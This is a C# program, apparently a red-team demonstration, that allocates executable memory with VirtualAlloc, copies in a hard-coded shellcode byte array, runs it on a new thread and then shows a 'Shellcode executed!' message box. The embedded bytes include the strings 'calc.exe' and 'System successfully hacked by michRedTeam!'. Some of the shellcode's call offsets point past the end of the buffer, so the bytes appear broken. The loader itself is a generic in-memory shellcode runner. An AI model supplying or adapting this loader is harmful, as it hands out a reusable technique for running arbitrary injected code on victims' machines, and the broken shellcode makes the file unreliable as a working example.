using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll")]
    private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern int MessageBoxW(IntPtr hWnd, [MarshalAs(UnmanagedType.LPWStr)] string lpText, [MarshalAs(UnmanagedType.LPWStr)] string lpCaption, uint uType);

    static void Main()
    {
        try
        {
            byte[] shellcode = new byte[]
            {
                   0x4D, 0x31, 0xC9, 0x4D, 0x31, 0xC0, 0x48, 0x31, 0xD2, 0x48,
                0x31, 0xC9, 0x52, 0x52, 0x52, 0x4C, 0x8D, 0x05, 0x36, 0x10,
                0x00, 0x00, 0x48, 0x8D, 0x15, 0x1F, 0x10, 0x00, 0x00, 0x48,
                0x8D, 0x0D, 0xDC, 0x0F, 0x00, 0x00, 0xE8, 0xD7, 0x1F, 0x00,
                0x00, 0xB9, 0xD0, 0x07, 0x00, 0x00, 0xE8, 0xD3, 0x1F, 0x00,
                0x00, 0x4D, 0x31, 0xC9, 0x6A, 0x30, 0x4C, 0x8D, 0x05, 0xCA,
                0x0F, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xEE, 0x0F, 0x00, 0x00,
                0x48, 0x31, 0xC9, 0xE8, 0xC4, 0x1F, 0x00, 0x00, 0x31, 0xC9,
                0xE8, 0xB7, 0x1F, 0x00, 0x00, 0x63, 0x61, 0x6C, 0x63, 0x2E,
                0x65, 0x78, 0x65, 0x00, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D,
                0x20, 0x73, 0x75, 0x63, 0x63, 0x65, 0x73, 0x73, 0x66, 0x75,
                0x6C, 0x6C, 0x79, 0x20, 0x68, 0x61, 0x63, 0x6B, 0x65, 0x64,
                0x20, 0x62, 0x79, 0x20, 0x6D, 0x69, 0x63, 0x68, 0x52, 0x65,
                0x64, 0x54, 0x65, 0x61, 0x6D, 0x21, 0x00, 0x48, 0x61, 0x63,
                0x6B, 0x65, 0x64, 0x00, 0xCC 
            };

            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
            if (addr == IntPtr.Zero)
                throw new Exception("Failed to allocate memory");

            Marshal.Copy(shellcode, 0, addr, shellcode.Length);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            if (hThread == IntPtr.Zero)
                throw new Exception("Failed to create thread");

            WaitForSingleObject(hThread, 0xFFFFFFFF);

            // Mostrar un MessageBox después de ejecutar el shellcode
            MessageBoxW(IntPtr.Zero, "Shellcode executed!", "Success", 0x30);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error: {ex.Message}");
        }
    }
}
